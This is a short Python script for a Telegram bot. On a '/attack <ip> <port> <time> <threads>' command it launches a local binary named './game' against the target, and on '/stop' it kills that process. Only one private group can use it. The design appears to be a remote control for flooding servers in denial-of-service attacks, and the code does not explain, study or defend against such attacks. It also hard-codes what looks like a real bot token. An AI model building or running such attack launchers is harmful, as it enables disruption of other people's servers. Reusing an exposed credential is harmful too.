import telebot
import subprocess

TOKEN = '7821639514:AAH74HXLB2ap3IF1mwr5JEELzATQ_p7H3bU'
GROUP_ID = -4801647527  # your private group ID
BINARY_PATH = './game'
running = {}

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['attack'])
def attack(message):
    if message.chat.id != GROUP_ID:
        return

    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time> <threads>")
        return

    _, ip, port, time_sec, threads = args
    cmd = [BINARY_PATH, ip, port, time_sec, threads]

    try:
        process = subprocess.Popen(cmd)
        running[process.pid] = process
        bot.reply_to(message, f"Attack started! PID: {process.pid}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.chat.id != GROUP_ID:
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /stop <pid>")
        return

    try:
        pid = int(args[1])
        if pid in running:
            running[pid].terminate()
            bot.reply_to(message, f"Stopped attack with PID {pid}")
            del running[pid]
        else:
            bot.reply_to(message, "PID not found.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

bot.polling()
